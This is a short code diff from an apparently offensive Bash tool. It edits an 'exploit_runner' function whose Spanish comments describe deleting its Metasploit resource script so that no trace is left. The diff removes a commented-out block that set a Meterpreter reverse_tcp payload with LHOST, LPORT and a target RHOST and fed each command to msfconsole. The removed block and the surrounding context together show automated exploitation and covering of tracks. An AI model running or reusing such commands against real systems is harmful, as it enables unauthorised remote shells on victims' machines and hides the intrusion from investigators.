@@ -114,14 +114,6 @@ exploit_runner() {
         
         # Se borrar el script para no dejar rastro
         rm /tmp/script.rc
-        
-        # Guardar comandos para Metasploit
-        #comandos_metasploit=("use $vuln" "set PAYLOAD windows/meterpreter/reverse_tcp" "set LHOST 127.0.0.1" "set LPORT 4444" "set RHOST $ip2")
-        # Ejecutar comandos de Metasploit
-        #for comando in "${comandos_metasploit[@]}"; do
-        #    echo "Ejecutando: $comando"
-        #    msfconsole -q -x "$comando"
-        #done
     done
 
     echo "${BOLD}${UNDERLINE}=================================================================================${RESET}"
